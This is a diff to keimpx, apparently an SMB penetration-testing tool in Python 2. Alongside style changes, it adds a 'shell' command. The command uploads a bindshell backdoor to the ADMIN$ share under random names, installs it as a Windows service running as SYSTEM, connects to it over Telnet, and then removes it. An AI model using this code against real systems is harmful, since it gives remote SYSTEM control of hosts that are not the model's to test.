@@ -61,6 +61,7 @@ __version__ = '0.2-dev'
 import binascii
 import logging
 import os
+import random
 import re
 import rlcompleter
 import socket
@@ -77,6 +78,7 @@ from subprocess import mswindows
 from subprocess import PIPE
 from subprocess import Popen
 from subprocess import STDOUT
+from telnetlib import Telnet
 from threading import Thread
 
 try:
@@ -123,6 +125,11 @@ logger_handler.setFormatter(formatter)
 logger.addHandler(logger_handler)
 logger.setLevel(logging.WARN)
 
+if hasattr(sys, "frozen"):
+    keimpx_path = os.path.dirname(unicode(sys.executable, sys.getfilesystemencoding()))
+else:
+    keimpx_path = os.path.dirname(os.path.realpath(__file__))
+
 
 class credentialsError(Exception):
     pass
@@ -141,6 +148,10 @@ class threadError(Exception):
 
 
 class missingShare(Exception):
+    pass
+
+
+class missingFile(Exception):
     pass
 
 
@@ -181,6 +192,7 @@ def autoCompletion():
                               'rmdir':      None,
                               'deploy':     None,
                               'undeploy':   None,
+                              'shell':      None,
                               'users':      None,
                               'pswpolicy':  None,
                               'domains':    None,
@@ -219,9 +231,9 @@ def display_time(filetime_high, filetime_low, minutes_utc=0):
     d -= 11644473600 # remove 3389 years?
 
     try:
-        return strftime("%a, %d %b %Y %H:%M:%S +0000ddddd", localtime(d)) # return the standard format day
+        return strftime('%a, %d %b %Y %H:%M:%S +0000ddddd', localtime(d)) # return the standard format day
     except ValueError, e:
-        return "0"
+        return '0'
 
 
 class ExtendInplace(type):
@@ -239,10 +251,10 @@ class ExtendInplace(type):
 
 
 def convert(low, high, no_zero):
-    if low == 0 and hex(high) == "-0x80000000":
-        return "Not Set"
+    if low == 0 and hex(high) == '-0x80000000':
+        return 'Not Set'
     if low == 0 and high == 0:
-        return "None"
+        return 'None'
     if no_zero: # make sure we have a +ve vale for the unsined int
         if (low != 0):
             high = 0 - (high+1)
@@ -254,26 +266,26 @@ def convert(low, high, no_zero):
     tmp *= (1e-7) #  convert to seconds
 
     try:
-        minutes = int(strftime("%M", gmtime(tmp)))  # do the conversion to human readable format
+        minutes = int(strftime('%M', gmtime(tmp)))  # do the conversion to human readable format
     except ValueError, e:
-        return "BAD TIME:"
+        return 'BAD TIME:'
 
-    hours = int(strftime("%H", gmtime(tmp)))
-    days = int(strftime("%j", gmtime(tmp)))-1
-    time = ""
+    hours = int(strftime('%H', gmtime(tmp)))
+    days = int(strftime('%j', gmtime(tmp)))-1
+    time = ''
 
     if days > 1:
-     time = str(days) + " days "
+     time = str(days) + ' days '
     elif days == 1:
-        time = str(days) + " day "
+        time = str(days) + ' day '
     if hours > 1:
-        time += str(hours) + " hours "
+        time += str(hours) + ' hours '
     elif hours == 1:
-        time = str(days) + " hour "    
+        time = str(days) + ' hour '    
     if minutes > 1:
-        time += str(minutes) + " minutes"
+        time += str(minutes) + ' minutes'
     elif minutes == 1:
-        time = str(days) + " minute "
+        time = str(days) + ' minute '
 
     return time
 
@@ -336,20 +348,20 @@ class MSRPCPassInfo:
 
 
     def print_friendly(self):
-        print "Minimum password length: %s" % str(self._min_pass_length or "None")
-        print "Password history length: %s" % str(self._pass_hist or "None" )
-        print "Maximum password age: %s" % str(convert(self._max_age_low, self._max_age_high, 1))
-        print "Password Complexity Flags: %s" % str(self._pass_prop or "None")
-        print "Minimum password age: %s" % str(convert(self._min_age_low, self._min_age_high, 1))
-        print "Reset Account Lockout Counter: %s" % str(convert(self._lockout_window_low,self._lockout_window_high, 1)) 
-        print "Locked Account Duration: %s" % str(convert(self._lockout_dur_low,self._lockout_dur_high, 1)) 
-        print "Account Lockout Threshold: %s" % str(self._lockout_thresh or "None")
-        print "Forced Log off Time: %s" % str(convert(self._max_force_low, self._max_force_high, 1))
+        print 'Minimum password length: %s' % str(self._min_pass_length or 'None')
+        print 'Password history length: %s' % str(self._pass_hist or 'None' )
+        print 'Maximum password age: %s' % str(convert(self._max_age_low, self._max_age_high, 1))
+        print 'Password Complexity Flags: %s' % str(self._pass_prop or 'None')
+        print 'Minimum password age: %s' % str(convert(self._min_age_low, self._min_age_high, 1))
+        print 'Reset Account Lockout Counter: %s' % str(convert(self._lockout_window_low,self._lockout_window_high, 1)) 
+        print 'Locked Account Duration: %s' % str(convert(self._lockout_dur_low,self._lockout_dur_high, 1)) 
+        print 'Account Lockout Threshold: %s' % str(self._lockout_thresh or 'None')
+        print 'Forced Log off Time: %s' % str(convert(self._max_force_low, self._max_force_high, 1))
 
         i = 0
 
         for a in self._pass_prop:
-            print "%s: %s" % (self.PASSCOMPLEX[i], str(a))
+            print '%s: %s' % (self.PASSCOMPLEX[i], str(a))
 
             i+= 1
 
@@ -556,19 +568,19 @@ class SMBShell:
             raise missingShare, 'Share has not been specified'
 
 
-    def eval(self, i=None):
+    def eval(self, cmd=None):
         '''
         Evaluate the command provided via the command prompt
         '''
 
-        if i is None:
+        if cmd is None:
             self.exit()
 
-        elif i[0] == '!':
-            self.__local_exec(i[1:])
+        elif cmd[0] == '!':
+            self.__local_exec(cmd[1:])
             return
 
-        l = string.split(i, ' ')
+        l = string.split(cmd, ' ')
         cmd = l[0]
 
         try:
@@ -581,6 +593,12 @@ class SMBShell:
 
         except smb.SessionError, e:
             logger.error('SMB exception: %s' % str(e).split('code: ')[1])
+
+        except smb.UnsupportedFeature, e:
+            logger.error('SMB exception: %s. Retrying..' % str(e))
+
+            time.sleep(1)
+            self.eval(cmd)
 
         except Exception, e:
             logger.error('Exception: %s' % e)
@@ -635,8 +653,12 @@ rmdir {dirname} - removes the directory under the current path
 
 Services options
 ================
-deploy {service name} {filename} [service args] - deploy remotely a service binary
-undeploy {srvname} {filename} - undeploy remotely a service binary
+deploy {service name} {local file} [service args] - deploy remotely a service binary
+undeploy {service name} {remote file} - undeploy remotely a service binary
+
+Shell options
+=============
+shell [port] - spawn a shell listening on a TCP port, by default 2090/tcp
 
 Users options
 =============
@@ -644,7 +666,7 @@ users [domain] - list users, optionally for a specific domain
 pswpolicy [domain] - list password policy, optionally for a specific domain
 domains - list domains to which the system is part of
 
-Registry options (TODO)
+Registry options (Soon)
 ================
 regread {registry key} - read a registry key
 regwrite {registry key} {registry value} - add a value to a registry key
@@ -739,17 +761,21 @@ regdelete {registry key} - delete a registry key
         if path is None:
             self.pwd = ''
             return
+
         elif path == '.':
             return
+
         elif path == '..':
             sep = self.pwd.split('\\')
             self.pwd = '\\'.join(s for s in sep[:-1])
+
             return
 
         path = self.__replace(path)
 
         if path[0] == '\\':
            self.pwd = path
+
         else:
            self.pwd += '\\%s' % path
 
@@ -764,7 +790,7 @@ regdelete {registry key} - delete a registry key
 
     def dir(self, path=None):
         '''
-        Wrapper method to list files from the current/provided path
+        Alias to ls
         '''
 
         self.ls(path)
@@ -779,17 +805,20 @@ regdelete {registry key} - delete a registry key
 
         if path is None:
             pwd = '%s\\*' % self.pwd
+
         else:
             pwd = '%s\\%s\\*' % (self.pwd, self.__replace(path))
 
         for f in self.__smb.list_path(self.share, pwd):
             if f.is_directory() == 16:
                 is_dir = '<DIR>'
+
             else:
                 is_dir = '     '
 
             if f.get_filesize() == 0:
                 filesize = '   '
+
             else:
                 filesize = f.get_filesize()
 
@@ -821,6 +850,14 @@ regdelete {registry key} - delete a registry key
         self.__smb.close(self.tid, self.fid)
 
 
+    def get(self, filename):
+        '''
+        Alias to download
+        '''
+
+        self.download(filename)
+
+
     def download(self, filename):
         '''
         Download a file from the current path
@@ -835,6 +872,14 @@ regdelete {registry key} - delete a registry key
         fh.close()
 
 
+    def put(self, filename, share=None, destfile=None):
+        '''
+        Alias to upload
+        '''
+
+        self.upload(filename, share=None, destfile=None)
+
+
     def upload(self, filename, share=None, destfile=None):
         '''
         Upload a file in the current path
@@ -844,7 +889,7 @@ regdelete {registry key} - delete a registry key
             fp = open(filename, 'rb')
         except IOError:
             logger.error('Unable to open file \'%s\'' % filename)
-            return
+            sys.exit(1)
 
         if share is None:
             self.__check_share()
@@ -893,33 +938,95 @@ regdelete {registry key} - delete a registry key
         self.__smb.rmdir(self.share, path)
 
 
-    def deploy(self, srvname, filename, srvargs='\x00'):
+    def deploy(self, srvname, local_file, srvargs=None, remote_file=None):
         '''
-        Wrapper method to deploy a Windows service. It uploads the service
-        executable to the file system, creates a service as 'Automatic'
-        and starts it
-        '''
-
-        self.__service_bin_upload(filename)
-        self.__service_connect()
-        self.__service_create(srvname, filename)
-        self.__service_start(srvname, srvargs)
-        self.__service_disconnect()
-
-
-    def undeploy(self, srvname, filename):
-        '''
-        Wrapper method to undeploy a Windows service. It removes the service
-        executable from the file system and marks the service as 'Disabled'
+        Deploy a Windows service: upload the service executable to the
+        file system, create a service as 'Automatic' and start it
         '''
 
-        logger.warn('Reboot is needed to fully remove the service')
+        if srvargs is None:
+            srvargs = '\x00'
+        else:
+            srvargs = [ str(srvargs), ]
 
-        self.__service_connect()
-        self.__service_stop(srvname)
-        self.__service_delete(srvname)
-        self.__service_disconnect()
-        self.__service_bin_remove(filename)
+        if remote_file is None:
+            remote_file = str(os.path.basename(local_file.replace('\\', '/')))
+
+        self.__old_pwd = self.pwd
+        self.pwd = ''
+
+        self.__svcctl_bin_upload(local_file, remote_file)
+        self.__svcctl_connect()
+        self.__svcctl_create(srvname, remote_file)
+        self.__svcctl_start(srvname, srvargs)
+        self.__svcctl_disconnect()
+
+        self.pwd = self.__old_pwd
+
+
+    def undeploy(self, srvname, remote_file):
+        '''
+        Wrapper method to undeploy a Windows service. It stops the
+        services, removes it and removes the executable from the file
+        system
+        '''
+
+        remote_file = str(os.path.basename(remote_file.replace('\\', '/')))
+
+        self.__old_pwd = self.pwd
+        self.pwd = ''
+
+        self.__svcctl_connect()
+        self.__svcctl_stop(srvname)
+        self.__svcctl_delete(srvname)
+        self.__svcctl_disconnect()
+        self.__svcctl_bin_remove(remote_file)
+
+        self.pwd = self.__old_pwd
+
+
+    def shell(self, port=2090):
+        '''
+        Deploy a bindshell backdoor listening on a predefined TCP port for
+        incoming connections then spawning a command prompt as SYSTEM.
+        '''
+
+        connected = False
+        srvname = ''.join([random.choice(string.letters) for _ in xrange(0, 6)])
+        local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
+        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in xrange(0, 6)])
+
+        if not os.path.exists(local_file):
+            raise missingFile, 'srv_bindshell.exe not found in the contrib subfolder'
+
+        self.deploy(srvname, local_file, port, remote_file)
+
+        logger.info('Connecting to backdoor on port %d, wait..' % int(port))
+
+        for counter in range(0, 3):
+            try:
+                time.sleep(1)
+                tn = Telnet(self.__dstip, int(port), 3)
+                connected = True
+                tn.interact()
+
+            except (socket.error, socket.herror, socket.gaierror, socket.timeout), e:
+                if connected is False:
+                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (int(port), e[1])
+
+                    if counter < 2:
+                        warn_msg += ', retrying..'
+
+                    logger.warn(warn_msg)
+
+            except Exception, e:
+                logger.error('Exception: %s' % e)
+
+            if connected is True:
+                break
+
+        time.sleep(1)
+        self.undeploy(srvname, remote_file)
 
 
     def users(self, usrdomain=None):
@@ -960,9 +1067,9 @@ regdelete {registry key} - delete a registry key
             raise RuntimeError
 
 
-    def __service_connect(self):
+    def __svcctl_connect(self):
         '''
-        Connect to svcctl
+        Connect to svcctl named pipe
         '''
 
         logger.info('Connecting to the SVCCTL named pipe')
@@ -988,9 +1095,9 @@ regdelete {registry key} - delete a registry key
         self.__mgr_handle = resp.get_context_handle()
 
 
-    def __service_disconnect(self):
+    def __svcctl_disconnect(self):
         '''
-        Disconnect from svcctl
+        Disconnect from svcctl named pipe
         '''
 
         logger.debug('Disconneting from the SVCCTL named pipe')
@@ -1002,45 +1109,42 @@ regdelete {registry key} - delete a registry key
         self.__dce.disconnect()
 
 
-    def __service_bin_upload(self, filename):
+    def __svcctl_bin_upload(self, local_file, remote_file):
         '''
         Upload the service binary
         '''
 
-        srvfilename = os.path.basename(filename)
         share = 'ADMIN$'
 
-        logger.info('Uploading the service binary file \'%s\' to %s' % (srvfilename, share))
+        logger.info('Uploading the service executable to \'%s\\%s\'' % (share, remote_file))
 
-        self.upload(filename, share, srvfilename)
+        self.upload(local_file, share, remote_file)
 
 
-    def __service_bin_remove(self, filename):
+    def __svcctl_bin_remove(self, remote_file):
         '''
         Remove the service binary
         '''
 
-        srvfilename = os.path.basename(filename)
+        share = 'ADMIN$'
 
-        logger.info('Removing the service binary file \'%s\'' % srvfilename)
+        logger.info('Removing the service executable \'%s\\%s\'' % (share, remote_file))
 
-        self.rm(srvfilename, share='ADMIN$')
+        self.rm(remote_file, share)
 
 
-    def __service_create(self, srvname, filename):
+    def __svcctl_create(self, srvname, remote_file):
         '''
         Create the service
         '''
 
-        srvfilename = os.path.basename(filename)
-
         logger.info('Creating the service \'%s\'' % srvname)
 
-        data = self.__svc.create_service(self.__mgr_handle, srvname, '%%systemroot%%\\%s' % srvfilename)
+        data = self.__svc.create_service(self.__mgr_handle, srvname, '%%SystemRoot%%\\%s' % remote_file)
         self.rpcerror(data.get_return_code())
 
 
-    def __service_delete(self, srvname):
+    def __svcctl_delete(self, srvname):
         '''
         Delete the service
         '''
@@ -1052,7 +1156,7 @@ regdelete {registry key} - delete a registry key
         self.__svc.delete_service(svc_handle)
 
 
-    def __service_start(self, srvname, srvargs):
+    def __svcctl_start(self, srvname, srvargs):
         '''
         Start the service
         '''
@@ -1069,7 +1173,7 @@ regdelete {registry key} - delete a registry key
         self.rpcerror(data.get_return_code())
 
 
-    def __service_stop(self, srvname):
+    def __svcctl_stop(self, srvname):
         '''
         Stop the service
         '''
@@ -1088,7 +1192,7 @@ regdelete {registry key} - delete a registry key
 
     def __samr_connect(self):
         '''
-        Connect to samr
+        Connect to samr named pipe
         '''
 
         logger.info('Connecting to the SAMR named pipe')
@@ -1108,7 +1212,7 @@ regdelete {registry key} - delete a registry key
 
     def __samr_disconnect(self):
         '''
-        Disconnect from samr
+        Disconnect from samr named pipe
         '''
 
         logger.debug('Disconneting from the SAMR named pipe')
@@ -1284,12 +1388,13 @@ regdelete {registry key} - delete a registry key
 
     def rpcerror(self, code):
         '''
-        Check for an error in response packet
+        Check for an error in a response packet
         '''
 
         if code in dcerpc.rpc_status_codes:
             logger.error('Error during negotiation: %s (%d)' % (dcerpc.rpc_status_codes[code], code))
             raise RuntimeError
+
         elif code != 0:
             logger.error('Unknown error during negotiation (%d)' % code)
             raise RuntimeError
